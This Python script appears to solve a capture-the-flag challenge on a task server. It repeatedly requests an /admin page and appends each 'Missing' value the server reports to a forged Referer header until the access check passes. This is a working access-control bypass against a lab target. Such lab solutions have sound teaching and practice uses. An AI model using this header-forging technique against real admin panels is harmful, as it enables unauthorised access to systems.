import requests

url = "http://ifj2ee6gyadkqutl6bgb2ut3-access-easy.task-caplag.ru/admin"

headers = {
    "Referer": "supersecret, rmmguyvi, uqselkes, quiutvbp, ggduhcoy, rvlrrenm",
    "Host": "ifj2ee6gyadkqutl6bgb2ut3-access-easy.task-caplag.ru",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i=0",
}

while True:
    response = requests.get(url, headers=headers)
    print(response.text)

    if "Missing" not in response.text:
        break

    missing = response.text[24:]
    print(missing)

    headers["Referer"] += ", " + missing
    print(headers["Referer"])
